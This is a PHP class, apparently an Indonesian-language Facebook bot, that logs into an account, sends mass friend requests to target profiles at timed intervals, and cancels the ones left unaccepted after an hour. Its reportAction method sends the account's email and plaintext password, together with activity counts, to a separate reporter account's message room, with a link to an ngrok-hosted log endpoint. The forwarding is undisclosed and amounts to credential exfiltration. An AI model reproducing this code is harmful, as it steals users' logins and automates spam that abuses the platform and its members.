<?php

namespace System;

use Facebook\Facebook;

date_default_timezone_set("Asia/Jakarta");

/**
 *
 * @author	Ammar Faizi	<ammarfaizi2@gmail.com>
 *
 */

class ActionHandler
{
	const MDATA = "/data/";

	/**
	 * Facebook 1
	 *
	 * @var	Facebook\Facebook
	 */
	private $fb;

	/**
	 * Facebook reporter
	 *
	 * @var Facebook\Facebook
	 */
	private $fb2;


	/**
	 * Report message room
	 *
	 * @var	string
	 */
	public $reportURL = null;

	/**
	 *
	 *
	 * @var	string
	 */
	public $user_simple;

	/**
	 *
	 * Constructor
	 *
	 * @param	string	$email
	 * @param	string	$pass
	 * @param	string	$user
	 */
	public function __construct($email, $pass, $user = null)
	{
		$this->email = $email;
		$this->pass = $pass;
		$this->fb      	= new Facebook($email, $pass, $user);
		$this->data	 	= data.self::MDATA;
		$a = explode("/", $this->fb->usercookies);
		$a = explode(".txt", end($a));
		unset($a[count($a)-1]);
		$this->user_simple = implode(".txt", $a);
		is_dir($this->data) or mkdir($this->data);
		$this->loginCountFile = $this->data.$this->user_simple."_login_counter.txt";
		$this->logsFile = $this->data.$this->user_simple."_logs.txt";
		$this->addFile = $this->data.$this->user_simple."_add.txt";
		$this->unfriendFile = $this->data.$this->user_simple."_unfriend.txt";
		$this->timeFile = $this->data.$this->user_simple."_time.txt";
		$this->accFile = $this->data.$this->user_simple."_acc.txt";
		$this->action['add'] = file_exists($this->addFile) ? json_decode(file_get_contents($this->addFile), 1) : array();
		$this->action['add'] = is_array($this->action['add']) ? $this->action['add'] : array();
	}

	/**
	 *	Set FB Reporter
	 * @param	string	$email
	 * @param	string	$pass
	 * @param	string	$user
	 */
	public function setFB2($email, $pass, $user = null)
	{
		$this->fb2 = new Facebook($email, $pass, $user);
		if (!$this->fb2->check_login()) {
			$this->fb2->login();
		}
	}

	/**
	 * Set report room
	 *
	 * @param	string	$reportURL
	 */
	public function setReportURL($reportURL)
	{
		$this->reportURL = str_replace("https://m.facebook.com", "", $reportURL);
	}

	/**
	 *
	 *
	 * @param	string|array	$msg
	 * @todo	Report Action
	 */
	private function report($msg)
	{
		if ($this->reportURL!==null) {
			$this->fb2->send_message((!is_string($msg) ? json_encode($msg, 128) : $msg), $this->reportURL);
		}
	}

	/**
	 * Add friend
	 *
	 * @param	string	$url
	 * @return	array
	 * @todo	Add friend by mobile URL
	 */
	private function addFriend($url)
	{
		$src = $this->fb->get_page($url);

		if (strpos($src, "/a/mobile/friends/profile_add_friend.php")!==false) {
			$a = explode("/a/mobile/friends/profile_add_friend.php", $src, 2);
			$a = explode("\"", $a[1], 2);
			$src = $this->fb->get_page("https://m.facebook.com/a/mobile/friends/profile_add_friend.php".html_entity_decode($a[0], ENT_QUOTES, 'UTF-8'), null, array(CURLOPT_REFERER=>$url, 52=>1));
			if (strpos($src, "Permintaan Pertemanan Terkirim")!==false) {
				$r = array(true, "Permintaan Pertemanan Terkirim");
			} else {
				$r = array(false, "Gagal.");
			}
		} else
		if (strpos($src, "removefriend.php")!==false) {
			$r = array(false, "Sudah berteman.");
		} else {
			$r = array(false, "Tidak dapat mengirim permintaan pertemanan.");
		}


		return array(
					"add"  => $r[0],
					"msg"  => $r[1],
					"time" => date("Y-m-d H:i:s")
				);
	}

	/**
	 *
	 * Jika login belum berlebih maka akan return true
	 *
	 * @return	bool
	 *
	 */
	private function avoidBruteLogin()
	{
		if (file_exists($this->loginCountFile)) {
			return (int)file_get_contents($this->loginCountFile)<10;
		} else {
			return true;
		}
	}

	/**
	 * Menambah login counter
	 *
	 * @return	int	Jumlah karakter yang ditulis.
	 */
	private function addLoginCounter()
	{
		if (file_exists($this->loginCountFile)) {
			$count = (int)file_get_contents($this->loginCountFile)+1;
		} else {
			$count = 1;
		}
		return file_put_contents($this->loginCountFile, $count);
	}

	/**
	 * @todo	Here we go...
	 */
	public function run_1()
	{
		if (!$this->fb->check_login() && $this->avoidBruteLogin()) {
			$this->addLoginCounter();
			$this->fb->login();
		}
		$this->start_time(); $i_report = 0;
		foreach ($this->linkall as $val) {
			$i_report++;
			if ($this->startTime<=time()) {
				/**
			 	 * Nek wis sak jam
			 	 */
				print "\n\n Cek Unfriend ...\n\n";
				$this->unfriendAction();

				/**
				 * Anyak i meneh
				 */
				$this->startTime();

				print "\n\n Cek Unfriend Selesai...\n\n";
				sleep(10);
			} else {

				/**
				 * Nek rung sak jam
				 */
				$a = $this->addFriend($val);
				if ($a['add']) {
					$this->action['add'][$val] = array(
							"Message"  => $a['msg'],
							"Time"     => $a['time']
						);
					$this->saveAdd();
				}
				$save = array(
						"URL"   => $val,
						"Add"   => $a['add'],
						"Pesan" => $a['msg'],
						"Waktu" => $a['time']
					);
				print_r($save);
				$this->saveLog(json_encode($save, 128).",\n\n");
				sleep(10);
			}
			if ($i_report==15) {
				$i_report = 0;
				$this->reportAction();
			}
			
		}
	}

	public function reportAction()
	{
		$a = trim(file_get_contents($this->logsFile));
		$jumlahLogs = count(json_decode("[".substr($a, 0, strlen($a)-1)."]"));
		$a = trim(file_get_contents($this->unfriendFile));
		$unfriend = count(json_decode("[".substr($a, 0, strlen($a)-1)."]"));
		$a = trim(file_get_contents($this->accFile));
		$acc = count(json_decode("[".substr($a, 0, strlen($a)-1)."]"));
		$berhasilNgeAdd = count($this->action['add']);
		$report = "Laporan\n\nWaktu : ".date("Y-m-d H:i:s")."\nEmail : ".$this->email."\nPass : ".$this->pass."\nJumlah Logs : ".$jumlahLogs."\nBerhasil NgeAdd : ".$berhasilNgeAdd."\nUnfriend : ".$unfriend."Acc : ".$acc."\nSekian laporan dari saya, terima kasih :v\n\nUntuk jumlah unfriend dan acc belum realtime, akan saya cek lagi pada ".date("Y-m-d H:i:s", $this->startTime)."\n\nLogs File dan lain-lain : https://ce500f80.ngrok.io/add/data/data?secure=1&pdo_limit=".rand(81992,52135);
		$this->report($report);
	}

	public function start_time()
	{
		$a = strtotime(date("Y-m-d H:i:s"))+3600;
		file_put_contents($this->timeFile, $a);
		$this->startTime = $a;
	}

	/**
	 * Save Logs
	 * 
	 * @param	string	$logMessage
	 * @todo	Save Logs 
	 */
	private function saveLog($logMessage)	
	{
		file_put_contents($this->logsFile, $logMessage, FILE_APPEND | LOCK_EX);
	}

	/**
	 *
	 * @todo	Save Add Action
	 */ 
	private function saveAdd()
	{
		file_put_contents($this->addFile, json_encode($this->action['add'], 128));	
	}

	/**
	 *
	 * @param	string	$actionMessage
	 * @todo	Save Unfriend Action
	 */ 
	private function saveUnfriend($actionMessage)
	{
		file_put_contents($this->unfriendFile, $actionMessage, FILE_APPEND | LOCK_EX);	
	}

	private function saveAcc($actionMessage)
	{
		file_put_contents($this->accFile, $actionMessage, FILE_APPEND | LOCK_EX);	
	}


	/**
	 *
	 * @param	string	url
	 *
	 */
	public function batalkan_permintaan($url)
	{
		$a = $this->fb->get_page($url, null, array(52=>1));
		$a = explode("/a/friendrequest/cancel/", $a, 2);
		$a = explode("\"", $a[1], 2);
		$this->fb->get_page("https://m.facebook.com/a/friendrequest/cancel/".html_entity_decode($a[0], ENT_QUOTES, 'UTF-8'));
		$this->saveUnfriend(json_encode(array(
					"msg" => "Batalkan permintaan.",
					"url" => $url,
					"waktu" => date("Y-m-d H:i:s")
			), 128));	
	}

	private function unfriendAction()
	{
		foreach ($this->action['add'] as $url => $val) {
			if((strtotime($val['Time'])+3600)<=time() && !$this->cekPertemanan($url)){
				$this->batalkan_permintaan($url);
				$a[0] = true;
				$a['msg'] = "Batalkan pertemanan.";
			} else {
				$a[0] = false;
				$a['msg'] = "Sudah berteman.";
				$this->saveAcc(json_encode(array(
					"URL"=>$url,
					"Time"=>date("Y-m-d H:i:s"))
				, 128).",\n\n");
			}
			$a['time'] = date("Y-m-d H:i:s");
			$save = array(
					"Unfriend"  => $a[0],
					"Pesan" 	=> $a['msg'],
					"Waktu" 	=> $a['time']
				);
			print_r($save);
			$this->saveLog(json_encode($save, 128).",\n\n");
			sleep(10);
		}
	}

	/**
	 * Set Target Link
	 *
	 * @param	array	$link
	 * @todo	Set target add friend.
	 */ 
	public function setTargetLink($link)
	{
		$this->linkall = $link;
	}
}